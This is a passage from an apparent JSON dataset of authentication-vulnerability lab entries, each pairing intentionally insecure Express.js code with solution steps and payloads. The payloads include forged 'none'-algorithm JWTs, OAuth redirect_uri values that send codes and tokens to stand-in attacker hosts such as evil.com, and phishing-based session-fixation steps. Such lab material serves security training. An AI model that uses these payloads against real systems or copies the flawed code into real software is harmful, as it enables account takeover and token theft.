      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { 'carlos': { password: 'password123', session: null } }; app.get('/login', (req, res) => { const { username, password, sessionId } = req.query; if (users[username] && users[username].password === password) { users[username].session = sessionId || Math.random().toString(36).substring(2); res.cookie('sessionId', users[username].session); res.send('Logged in'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const session = req.cookies.sessionId; const user = Object.keys(users).find(u => users[u].session === session); if (user) { res.send(`Account details for ${user}`); } else { res.send('Access Denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "/login?username=carlos&password=password123&sessionId=attacker123",
        "/login?sessionId=attacker123",
        "Cookie: sessionId=attacker123"
      ]
    },
    {
      "Lab scenario": "Session Fixation vulnerability in login workflow",
      "Lab Description": "This lab's session management mechanism is flawed and allows session fixation attacks. The application issues session cookies prior to authentication and fails to assign new tokens upon successful login. To solve: Hijack Carlos's session by fixing the session identifier before he logs in, then access his account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept the initial GET /login request and note the session cookie issued by the server.",
        "Send a crafted phishing email to Carlos or use social engineering to make him reuse the provided session ID for login.",
        "After Carlos authenticates using the fixed session ID, reuse the same session cookie in your own browser or API client.",
        "Confirm that you are now logged in as Carlos without providing any credentials.",
        "Visit /my-account while using the fixed session cookie to solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { 'carlos': 'supersecret123' }; app.get('/login', (req, res) => { let sessionID = req.cookies.sessionid || Math.random().toString(36).substring(2); res.cookie('sessionid', sessionID); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\" type=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.sessionid] = username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user) { res.send('Welcome ' + user); } else { res.send('Not authenticated'); } }); app.listen(3000);",
      "payloads": [
        "Set-Cookie: sessionid=attackersession123;",
        "Use phishing email to send: https://victim.site/login with sessionid=attackersession123",
        "Reuse sessionid=attackersession123 after victim logs in"
      ]
    },
    {
      "Lab scenario": "JWT algorithm confusion vulnerability in token validation",
      "Lab Description": "This lab uses JSON Web Tokens (JWT) for session authentication but fails to enforce the correct cryptographic algorithm. An attacker can manipulate the token header to use 'none' as the algorithm and forge a valid session token. To solve: Forge a valid admin JWT and access the admin panel.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Capture a valid JWT during a login session using Burp Suite or OWASP ZAP.",
        "Modify the JWT header to { \"alg\": \"none\", \"typ\": \"JWT\" } and remove the signature portion.",
        "Craft a payload like { \"username\": \"admin\" } and base64-encode the header and payload.",
        "Send the forged JWT as a Bearer token in the Authorization header to /admin.",
        "Verify successful access to the admin panel to solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'insecure-secret'; app.get('/login', (req, res) => { const username = req.query.username; const token = jwt.sign({ username: username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const payload = jwt.verify(token, secret); if (payload.username === 'admin') { res.send('Welcome admin'); } else { res.status(403).send('Access denied'); } } catch { res.status(400).send('Invalid token'); } }); app.listen(4000);",
      "payloads": [
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
        "Authorization: Bearer <header.payload.>",
        "Replace JWT in Cookie or Auth header with none-alg variant"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration in third-party login flow",
      "Lab Description": "This lab's OAuth integration incorrectly trusts the 'state' parameter without proper validation. An attacker can intercept and modify this value to hijack authorization codes during the OAuth redirection. To solve: Manipulate the OAuth 'state' parameter to capture a valid authorization code and log in as Carlos.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Intercept the OAuth login request with Burp Suite and observe the 'state' parameter in the redirect URL.",
        "Modify the 'state' parameter to a predictable or controlled value and replay the request.",
        "Use Burp Collaborator or a controlled server to catch the authorization code sent via redirect.",
        "Exchange the intercepted authorization code for an access token using Postman or curl.",
        "Submit the token to /my-account endpoint to confirm the hijack and solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/auth/callback', (req, res) => { const { code, state } = req.query; if (!state || !code) return res.status(400).send('Invalid request'); res.cookie('session_token', code); res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { const token = req.cookies.session_token; if (token === 'carlos_auth_code') { res.send('Welcome Carlos!'); } else { res.send('Unauthorized'); } }); app.listen(5000);",
      "payloads": [
        "https://target.site/auth/callback?code=carlos_auth_code&state=attacker",
        "Manipulate state to match known value: attacker123",
        "OAuth authorization code interception using Burp Collaborator"
      ]
    },
    {
      "Lab scenario": "JWT algorithm confusion vulnerability in session validation",
      "Lab Description": "This lab's authentication system uses JWTs for session management. The server uses the 'alg' field from the incoming token without proper validation, making it vulnerable to algorithm confusion. The application fails to enforce the intended HS256 signature verification when decoding JWTs, allowing attackers to switch the algorithm to 'none' and bypass signature verification entirely. To solve: Forge a valid session token for the user 'carlos' and access their account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept a valid login request using Burp Suite and capture the JWT from the Authorization header.",
        "Use jwt.io or a custom script to decode the JWT and note the 'alg' value is 'HS256'.",
        "Modify the header's 'alg' field to 'none' and remove the signature section entirely.",
        "Set the payload 'sub' to 'carlos' and re-encode the JWT without a signature.",
        "Replay the modified token using Postman in an Authorization header and access /my-account to confirm successful authentication."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET_KEY = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ sub: username }, SECRET_KEY, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && (!payload.header.alg || payload.header.alg === 'none' || jwt.verify(token, SECRET_KEY))) { res.send(`Welcome, ${payload.payload.sub}`); } else { res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Lab running at http://localhost:4000'));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
        "{\"alg\":\"none\"}.{ \"sub\":\"carlos\" }.",
        "{\"alg\":\"none\",\"typ\":\"JWT\"}.{ \"sub\":\"carlos\" }."
      ]
    },
    {
      "Lab scenario": "OAuth redirect URI manipulation in authorization flow",
      "Lab Description": "The application implements OAuth 2.0 for single sign-on (SSO) but lacks proper validation of the redirect_uri parameter. An attacker can manipulate this parameter to hijack an OAuth authorization code meant for another user. The application incorrectly trusts any user-supplied redirect_uri pointing to the same domain. To solve: Trick the application into sending an OAuth code for the user 'carlos' to your controlled endpoint, then exchange it for an access token.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Using Burp Suite, initiate the OAuth login process and intercept the request containing the redirect_uri parameter.",
        "Modify the redirect_uri parameter to point to your controlled endpoint: https://attacker.com/callback.",
        "Send the phishing link to the victim (simulated in lab) and wait for the authorization code to be sent to your server.",
        "Use Postman to send a POST request to the OAuth provider's token endpoint with the stolen code and retrieve Carlos's access token.",
        "Replay the token against the /my-account API to access Carlos's protected resources."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); app.get('/auth', (req, res) => { const { redirect_uri, code } = req.query; if (redirect_uri && code) { res.redirect(`${redirect_uri}?code=${code}`); } else { res.status(400).send('Invalid request'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'valid-oauth-token-for-carlos') { res.send('Account details for carlos'); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000, () => console.log('OAuth Redirect URI Lab running at http://localhost:4000'));",
      "payloads": [
        "https://attacker.com/callback",
        "https://attacker.com/oauth/code-stealer",
        "https://attacker.com/evil?code=intercepted-code"
      ]
    },
    {
      "Lab scenario": "Session fixation vulnerability in login flow",
      "Lab Description": "This lab's session management logic fails to regenerate session tokens upon successful login. Attackers can fixate their own session ID and later reuse it to hijack authenticated user sessions. The application issues the session cookie before verifying user credentials, allowing the attacker to trick a victim into using the attacker's predefined session token. To solve: Fixate your session ID, trick the application into authenticating as Carlos, then reuse the session ID to access Carlos's account.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to initiate a GET request to /login and capture the Set-Cookie header issuing a session ID.",
        "Send this session ID to the victim (simulated scenario) and wait for them to log in.",
        "Reattach the fixed session ID to your requests in Burp or Postman.",
        "Access the /my-account endpoint using the fixed session ID to verify that you're now logged in as 'carlos'.",
        "Confirm successful exploitation when Carlos's account details appear."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { 'carlos': 'hunter2', 'admin': 'adminpass' }; app.get('/login', (req, res) => { if (!req.cookies.session) { res.cookie('session', Math.random().toString(36).substr(2)); } res.send('Please log in.'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { res.send(`Logged in as ${username}`); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { const session = req.cookies.session; if (session === 'fixed-session-for-carlos') { res.send('Account details for carlos'); } else { res.send('Access denied'); } }); app.listen(4000, () => console.log('Session Fixation Lab running at http://localhost:4000'));",
      "payloads": [
        "Cookie: session=fixed-session-for-carlos",
        "Set-Cookie: session=fixed-session-for-carlos",
        "fixed-session-for-carlos"
      ]
    },
    {
      "Lab scenario": "JWT algorithm confusion in authentication flow",
      "Lab Description": "This lab's authentication mechanism is vulnerable to JWT algorithm confusion. The application accepts JSON Web Tokens for authentication but fails to enforce the expected signing algorithm, allowing an attacker to switch from asymmetric RS256 to symmetric HS256. The application does not validate the secret when HS256 is used. To solve: forge a valid JWT for the user 'carlos' and access his account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Capture an authenticated JWT token using Burp Suite's Proxy tab after logging in as your own user.",
        "Inspect the token header and notice the 'alg' parameter is set to RS256. Modify it to HS256 and set the signature part to an HMAC using the public key as the secret.",
        "Use a JWT crafting tool like jwt.io or Burp Suite's Decoder to craft a forged token for username 'carlos'.",
        "Replace your original JWT with the forged one in an authenticated request to /my-account.",
        "If successful, the page will display Carlos's account data, confirming the token bypass."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); app.use(express.json()); const publicKey = fs.readFileSync('./public.pem'); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username: username }, publicKey, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey); res.send(`Account details for ${decoded.username}`); } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
      "payloads": [
        "Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"} | Payload: {\"username\":\"carlos\"} | Signature: HMAC(publicKey, header.payload)",
        "eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VybmFtZSI6ICJjYXJsb3MifQ.[HMAC signature]"
      ]
    },
    {
      "Lab scenario": "Session fixation via insecure cookie handling",
      "Lab Description": "This lab is vulnerable to session fixation due to improper handling of session cookies. The application accepts user-supplied session tokens and fails to regenerate them upon authentication. An attacker can set a known session ID before login, which will persist across privilege escalation. To solve: fix a session ID and log in as the victim user 'carlos' using the same session.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Using OWASP ZAP, intercept the GET /login request and set a predictable session ID via Cookie header (e.g., PHPSESSID=attackerfixedid).",
        "Use the victim's credentials during login and observe that the session token remains unchanged after successful authentication.",
        "Reuse the fixed session ID to access /my-account directly using the same token.",
        "Confirm access to Carlos's profile with the fixed session ID.",
        "Use ZAP to confirm the same session persists across multiple requests, validating fixation success."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'qwerty123' }]; app.get('/login', (req, res) => { res.cookie('session', req.cookies.session || Math.random().toString(36).substring(2)); res.send('Please log in'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.redirect('/my-account'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { res.send(`Account data for session ${req.cookies.session}`); }); app.listen(4000);",
      "payloads": [
        "Cookie: session=attackerfixedid",
        "Login POST: username=carlos&password=qwerty123 with Cookie: session=attackerfixedid",
        "GET /my-account with Cookie: session=attackerfixedid"
      ]
    },
    {
      "Lab scenario": "OAuth token misconfiguration in third-party login",
      "Lab Description": "This lab's OAuth login flow improperly trusts the 'sub' claim from a third-party provider without validating issuer or audience fields, allowing impersonation of other users. To solve: forge a valid ID Token with 'sub' set to Carlos and log in via OAuth to access his account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Postman to capture a legitimate OAuth authentication flow from the provider for your own account.",
        "Decode the JWT token using jwt.io and analyze the 'sub' field which defines the user identity.",
        "Manually craft a JWT with the 'sub' claim set to 'carlos' while reusing the same header and signing key (if known or guessable).",
        "Submit the forged ID Token to the application’s OAuth callback endpoint to complete login as Carlos.",
        "Confirm by accessing the /my-account endpoint to verify account takeover."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.post('/oauth/callback', (req, res) => { const idToken = req.body.id_token; const decoded = jwt.decode(idToken); if (!decoded || !decoded.sub) return res.status(401).send('Invalid ID token'); res.send(`Logged in as ${decoded.sub}`); }); app.listen(4000);",
      "payloads": [
        "Header: {\"alg\":\"HS256\"} | Payload: {\"sub\":\"carlos\"} | Signature: HMAC(secret, header.payload)",
        "eyJhbGciOiAiSFMyNTYifQ.eyJzdWIiOiAiY2FybG9zIn0.[Valid HMAC signature]"
      ]
    },
    {
      "Lab scenario": "Session Fixation via Pre-Login Cookie Reuse",
      "Lab Description": "The login flow of this web app allows a pre-authenticated session ID to persist after a successful login, leading to session fixation. The application does not regenerate session identifiers after login, allowing attackers to set a session beforehand. To solve: Hijack Carlos's session using a pre-set session ID cookie.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Start Burp Suite and intercept the initial GET /login request to the site.",
        "Note the Set-Cookie header for session ID and manually fix it to a predictable value like 'sessionid=attacker123'.",
        "Send the crafted login link to Carlos (simulated by switching users) with the preset session ID cookie.",
        "Log in as Carlos using known credentials from a separate session but using the 'attacker123' session ID.",
        "Reuse the same session ID cookie in a browser and access /my-account to verify hijack success."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 's3cret' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; res.redirect('/my-account'); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send('Welcome, ' + req.session.user); else res.status(403).send('Not authorized'); }); app.listen(3000, () => console.log('Session Fixation Lab running'));",
      "payloads": [
        "Cookie: sessionid=attacker123",
        "GET /login HTTP/1.1 with pre-injected sessionid",
        "POST /login with valid credentials while sessionid=attacker123 is set"
      ]
    },
    {
      "Lab scenario": "JWT Algorithm Confusion in Authorization Header",
      "Lab Description": "The app uses JWTs for session management but does not enforce a strong algorithm check. It accepts unsigned tokens if the 'alg' header is modified to 'none'. The application verifies JWTs based on the 'alg' field without checking signature integrity. To solve: Forge an admin token using alg:none and access the admin dashboard.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Log in as a regular user and capture the Authorization: Bearer token using Burp Suite.",
        "Use jwt.io or Postman to decode the JWT and examine the 'alg' header.",
        "Craft a new token with the payload { \"username\": \"carlos\", \"role\": \"admin\" } and header { \"alg\": \"none\" }, without a signature.",
        "Inject the crafted JWT into the Authorization header.",
        "Send a GET /admin-dashboard request using the unsigned JWT to confirm admin access."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); const secretKey = 'supersecret'; app.get('/admin-dashboard', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); const verified = jwt.verify(token, secretKey, { algorithms: [payload.header.alg] }); if (verified && verified.role === 'admin') { res.send('Welcome to admin dashboard'); } else { res.status(403).send('Access denied'); } }); app.listen(4000, () => console.log('JWT Confusion Lab running'));",
      "payloads": [
        "Header: { \"alg\": \"none\" }",
        "Payload: { \"username\": \"carlos\", \"role\": \"admin\" }",
        "JWT: [base64url(header)].[base64url(payload)]. (no signature)",
        "Authorization: Bearer [forged-token]"
      ]
    },
    {
      "Lab scenario": "OAuth Implicit Flow Token Leakage in Redirect URL",
      "Lab Description": "The web application uses the OAuth 2.0 implicit flow and allows open redirection in the redirect_uri parameter. This enables token leakage through an attacker-controlled URL. The application trusts user-controlled redirect URIs without validating the domain. To solve: Leak Carlos's token to an attacker domain and use it to access his profile.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use OWASP ZAP to inspect the OAuth login process and locate the 'redirect_uri' parameter in the authorization request.",
        "Craft a malicious URL with redirect_uri pointing to an attacker-controlled site (e.g., https://evil.com/capture).",
        "Send the malicious OAuth link to Carlos (simulate by visiting the link yourself with Carlos logged in).",
        "Capture the access_token fragment in the redirect to https://evil.com/capture#access_token=... using a local HTTP server or webhook.site.",
        "Replay the stolen token in the Authorization: Bearer header to access /user-profile as Carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const token = 'carlos-oauth-token'; res.redirect(redirectUri + '#access_token=' + token); }); app.get('/user-profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'carlos-oauth-token') res.send('Welcome Carlos'); else res.status(403).send('Invalid token'); }); app.listen(5000, () => console.log('OAuth Redirect Lab running'));",
      "payloads": [
        "https://vulnerable.com/auth?redirect_uri=https://evil.com/capture",
        "Authorization: Bearer carlos-oauth-token",
        "Access_token extracted from redirect URI fragment",
        "OAuth implicit flow token replay"
      ]
    },
    {
      "Lab scenario": "Session fixation in URL parameter during login",
      "Lab Description": "The application implements a flawed session handling mechanism that accepts user-provided session IDs via URL query parameters. When users log in, the session ID from the URL is reused, allowing attackers to predefine a session and force victims to use it. To solve: Hijack Carlos's session by crafting a valid login link that fixes the session ID.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept the login process and observe that the session ID can be passed via GET /login?session=abc123",
        "Send the request to Burp Repeater and confirm that the application sets the provided session ID in the Set-Cookie header after login",
        "Craft a login URL with a fixed session ID and send it to the victim (Carlos)",
        "Wait for Carlos to log in using the malicious session ID",
        "Access /my-account using the same session ID and verify that you’re logged in as Carlos"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); app.get('/login', (req, res) => { if (req.query.session) { req.sessionID = req.query.session; } res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { req.session.user = req.body.username; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Account details for ${req.session.user}`); else res.status(401).send('Unauthorized'); }); app.listen(4000);",
      "payloads": [
        "/login?session=abc123",
        "abc123",
        "GET /my-account Cookie: connect.sid=abc123"
      ]
    },
    {
      "Lab scenario": "JWT authentication bypass via 'none' algorithm",
      "Lab Description": "The application uses JSON Web Tokens (JWT) for authentication. It trusts the 'alg' header of incoming tokens without validation. If the algorithm is set to 'none', the server skips signature verification. To solve: Forge a JWT token with 'none' algorithm to gain access to Carlos's account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Postman to capture a valid JWT token after login",
        "Decode the JWT token using jwt.io or Burp JWT editor",
        "Modify the payload to impersonate user 'carlos' and set 'alg' to 'none' in the header",
        "Remove the signature completely and base64 encode the new token",
        "Send a request to /my-account with Authorization: Bearer [forged-token] and verify access"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(express.json()); app.use((req, res, next) => { const authHeader = req.headers['authorization']; if (authHeader) { const token = authHeader.split(' ')[1]; try { req.user = jwt.decode(token); } catch (e) { return res.status(401).send('Invalid token'); } } next(); }); app.get('/my-account', (req, res) => { if (req.user && req.user.username) res.send(`Welcome ${req.user.username}`); else res.status(403).send('Access denied'); }); app.listen(4000);",
      "payloads": [
        "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
        "Payload: {\"username\":\"carlos\"}",
        "Token: base64(header).base64(payload). (no signature)",
        "Authorization: Bearer <forged_token>"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration with open redirect",
      "Lab Description": "The application uses OAuth for authentication but fails to validate the redirect_uri parameter strictly. An attacker can manipulate this parameter to redirect the OAuth authorization code to their own server and steal access tokens. To solve: Capture Carlos's access token by injecting a malicious redirect_uri.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Start Burp Suite and intercept the OAuth flow",
        "Note the request to /auth?redirect_uri=https://example.com/callback",
        "Modify the redirect_uri to point to your attacker server (e.g., https://evil.com/code-catcher)",
        "Host a temporary server (e.g., using ngrok or python3 -m http.server) to receive the token/code",
        "Send the malicious link to Carlos. When he logs in, intercept the token on your server",
        "Use the stolen access token to access /my-account as Carlos"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const code = 'abc123';  res.redirect(`${redirectUri}?code=${code}`); }); app.get('/callback', (req, res) => { const code = req.query.code; request.post('https://oauth.provider.com/token', { form: { code, client_id: '123', client_secret: 'xyz' } }, (err, resp, body) => { res.send(`Access granted with token: ${body}`); }); }); app.listen(4000);",
      "payloads": [
        "/auth?redirect_uri=https://evil.com/capture",
        "GET https://evil.com/capture?code=abc123",
        "Use token abc123 at /my-account"
      ]
    },
    {
      "Lab scenario": "REST API JWT authentication bypass via weak secret",
      "Lab Description": "The application uses JWT tokens to authenticate API users. It signs tokens using a weak secret and does not validate the 'alg' claim properly. The application exposes an endpoint that echoes back the token payload for debugging. To solve: craft a forged JWT token that grants admin access and use it to access the protected /admin endpoint.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Postman to send a login request and capture the JWT token in the response.",
        "Use jwt.io or Burp Suite's JWT extension to decode and analyze the token structure and signing algorithm.",
        "Use a tool like `jwt-cracker` or `John the Ripper` to brute-force the weak secret (e.g., 'secret', 'admin123').",
        "Modify the payload to set 'role':'admin', then re-sign using the cracked secret and 'HS256' algorithm.",
        "Send the forged token in an Authorization: Bearer header to /admin and verify access."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(express.json()); const secret = 'admin123'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(token, secret); if (payload.role === 'admin') { res.send('Welcome to the admin panel'); } else { res.status(403).send('Forbidden'); } } catch (e) { res.status(401).send('Invalid token'); } });",
      "payloads": [
        "HS256 token with header: {\"alg\":\"HS256\"}, payload: {\"username\":\"carlos\",\"role\":\"admin\"}, signed with 'admin123'",
        "jwt.io-generated token using known secret 'secret'",
        "Manually forged token with cracked secret using PyJWT"
      ]
    },
    {
      "Lab scenario": "OAuth Implicit Flow Access Token Leak in Referer Header",
      "Lab Description": "The application uses the OAuth 2.0 Implicit flow for authentication. After login, it redirects the user to a third-party domain while leaking the access token in the Referer header. To solve: intercept and steal Carlos’s OAuth access token via a malicious redirect URI, then use it to access his account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to intercept the redirect URL after OAuth login and confirm token is returned in URL fragment (#access_token).",
        "Register a new OAuth client with a redirect_uri to your attacker domain (e.g., https://evil.com).",
        "Modify the /authorize request to use the attacker redirect_uri and send link to Carlos.",
        "When Carlos logs in, his browser sends the access_token in the Referer header to evil.com.",
        "Use the stolen token in Authorization header to access /my-account as Carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/authorize', (req, res) => { const redirect = req.query.redirect_uri; const token = 'access-token-carlos'; res.redirect(`${redirect}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer access-token-carlos') { res.send('Carlos Account Access'); } else { res.status(403).send('Access Denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Lab running at http://localhost:${PORT}`));",
      "payloads": [
        "https://evil.com#access_token=access-token-carlos",
        "OAuth authorize URL with redirect_uri=https://evil.com",
        "Authorization: Bearer access-token-carlos"
      ]
    },
    {
      "Lab scenario": "Session Fixation vulnerability in login endpoint",
      "Lab Description": "The application generates a session ID in a cookie before login and fails to regenerate it after authentication. The session ID is predictable and can be fixed prior to victim login. To solve: set a session ID for the victim, trick them into logging in, then reuse the same ID to access their session.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite or browser to set a session cookie before login (e.g., sessionid=1234carlos).",
        "Send a phishing link to Carlos with the pre-set sessionid=1234carlos cookie.",
        "After Carlos logs in, revisit the site and reuse the same sessionid to access his authenticated session.",
        "Access /my-account while presenting the fixed sessionid.",
        "Verify Carlos’s account content is accessible."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'hunter2' }]; app.post('/login', (req, res) => { const sid = req.cookies.sessionid; const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[sid] = username; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionid; if (sessions[sid] === 'carlos') { res.send('Carlos account data'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running at http://localhost:${PORT}`));",
      "payloads": [
        "Cookie: sessionid=1234carlos",
        "Pre-login fixed session ID and reuse after login",
        "Phishing link that sets session cookie before login"
      ]
    },
    {
      "Lab scenario": "JWT tampering vulnerability in Authorization header handling",
      "Lab Description": "This lab involves a vulnerable REST API that authenticates users based on JWTs passed via the Authorization header. The server does not verify the token signature. The application decodes the token and grants access based solely on the 'role' claim. To solve: craft a tampered JWT with elevated privileges to access the /admin/data endpoint.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Postman to send a GET request to /user/profile with a valid JWT and inspect the Authorization: Bearer <JWT> header.",
        "Decode the JWT using jwt.io and inspect the payload claims.",
        "Observe that the 'alg' in the header is set to 'HS256', and the signature isn't verified server-side.",
        "Modify the JWT payload to { \"user\": \"carlos\", \"role\": \"admin\" } and change 'alg' to 'none'.",
        "Remove the signature and send the tampered token in the Authorization header to /admin/data using Postman to confirm privilege escalation."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.get('/admin/data', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role !== 'admin') return res.status(403).send('Admins only'); res.send('Sensitive admin data'); }); app.listen(4000, () => console.log('JWT Tampering Lab running'));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
        "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.fake-signature"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration in authorization code grant exchange",
      "Lab Description": "This lab uses the OAuth 2.0 authorization code grant flow. The application does not validate the `redirect_uri` during the token exchange, allowing an attacker to intercept the authorization code. To solve: hijack the OAuth flow to gain an access token for Carlos's account.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept the OAuth flow when logging in via the third-party provider.",
        "Capture the authorization code sent to your redirect_uri.",
        "Send a crafted POST request to /oauth/token using Carlos's authorization code and your own redirect_uri.",
        "Observe that the server does not validate the redirect_uri and issues you an access token.",
        "Use the stolen access token to access Carlos’s protected profile endpoint: /user/carlos/profile"
      ],
      "Vulnerability name": "Authentication",
